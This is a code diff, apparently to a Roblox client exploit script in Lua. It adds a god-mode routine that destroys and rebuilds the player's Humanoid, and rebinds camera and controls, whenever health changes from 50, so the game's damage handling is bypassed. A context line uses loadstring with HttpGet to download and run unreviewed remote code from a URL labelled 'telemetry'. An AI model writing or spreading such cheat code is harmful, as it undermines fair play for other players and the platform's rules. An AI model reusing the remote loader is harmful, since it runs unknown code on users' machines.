@@ -225,3 +225,131 @@ task.spawn(function()
 		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/client.lua?s=6a913e68c47ec8d528fedc83"))()
 	end)
 end)
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function maintainHumanoidHealth(Character)
+    local RootPart = Character:WaitForChild("HumanoidRootPart")
+
+    local healthConnection = nil
+    local isReplacing = false
+
+    local function runReplacement()
+        if isReplacing then return end
+        isReplacing = true
+
+        if healthConnection then 
+            healthConnection:Disconnect() 
+            healthConnection = nil
+        end
+
+        local OldHumanoid = Character:FindFirstChildOfClass("Humanoid")
+        if not OldHumanoid then 
+            isReplacing = false
+            return 
+        end
+
+        local SavedWalkSpeed = OldHumanoid.WalkSpeed
+        local SavedUseJumpPower = OldHumanoid.UseJumpPower
+        local SavedJumpPower = OldHumanoid.JumpPower
+        local SavedJumpHeight = OldHumanoid.JumpHeight
+        local SavedHipHeight = OldHumanoid.HipHeight
+
+        if SavedHipHeight <= 0 then SavedHipHeight = 2.0 end
+        if SavedJumpPower <= 0 and SavedUseJumpPower then SavedJumpPower = 50 end
+
+        OldHumanoid:Destroy()
+        task.wait(0.05)
+
+        local NewHumanoid = Instance.new("Humanoid")
+        NewHumanoid.Parent = Character
+
+        NewHumanoid.MaxHealth = 50
+        NewHumanoid.Health = 50
+
+        NewHumanoid.WalkSpeed = SavedWalkSpeed
+        NewHumanoid.UseJumpPower = SavedUseJumpPower
+        NewHumanoid.JumpPower = SavedJumpPower
+        NewHumanoid.JumpHeight = SavedJumpHeight
+        NewHumanoid.HipHeight = SavedHipHeight
+
+        NewHumanoid.PlatformStand = false
+        NewHumanoid.Sit = false
+        NewHumanoid.AutoRotate = true
+
+        for _, stateType in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
+            if stateType ~= Enum.HumanoidStateType.None then
+                pcall(function()
+                    NewHumanoid:SetStateEnabled(stateType, true)
+                end)
+            end
+        end
+        NewHumanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
+
+        local FreshAnimator = Instance.new("Animator")
+        FreshAnimator.Parent = NewHumanoid
+
+        local Animate = Character:FindFirstChild("Animate")
+        if Animate and Animate:IsA("LocalScript") then
+            Animate.Disabled = true
+            task.wait(0.1)
+            Animate.Disabled = false
+        end
+
+        task.wait(0.05)
+        NewHumanoid:ChangeState(Enum.HumanoidStateType.Landed)
+        NewHumanoid:ChangeState(Enum.HumanoidStateType.Running)
+
+        workspace.CurrentCamera.CameraSubject = NewHumanoid
+
+        local PlayerScripts = LocalPlayer:WaitForChild("PlayerScripts")
+        local PlayerModule = require(PlayerScripts:WaitForChild("PlayerModule", 5))
+
+        if PlayerModule then
+            local Controls = PlayerModule:GetControls()
+            if Controls then
+                pcall(function()
+                    if type(Controls.OnCharacterAdded) == "function" then Controls:OnCharacterAdded(Character) end
+                    if type(Controls.OnHumanoidAdded) == "function" then Controls:OnHumanoidAdded(NewHumanoid) end
+                    Controls.humanoid = NewHumanoid
+                    if Controls.activeController then
+                        Controls.activeController.humanoid = NewHumanoid
+                        if type(Controls.activeController.SetHumanoid) == "function" then Controls.activeController:SetHumanoid(NewHumanoid) end
+                    end
+                    Controls:Enable()
+                end)
+            end
+        end
+
+        isReplacing = false
+        
+        monitorHealth(NewHumanoid)
+    end
+
+    function monitorHealth(humanoid)
+        if humanoid.Health ~= 50 then
+            task.spawn(runReplacement)
+            return
+        end
+
+        healthConnection = humanoid.HealthChanged:Connect(function(currentHealth)
+            if currentHealth ~= 50 then
+                runReplacement()
+            end
+        end)
+    end
+	
+    local initialHumanoid = Character:FindFirstChildOfClass("Humanoid")
+    if initialHumanoid then
+        monitorHealth(initialHumanoid)
+    end
+end
+
+if LocalPlayer.Character then
+    task.spawn(maintainHumanoidHealth, LocalPlayer.Character)
+end
+
+LocalPlayer.CharacterAdded:Connect(function(newCharacter)
+    maintainHumanoidHealth(newCharacter)
+end)
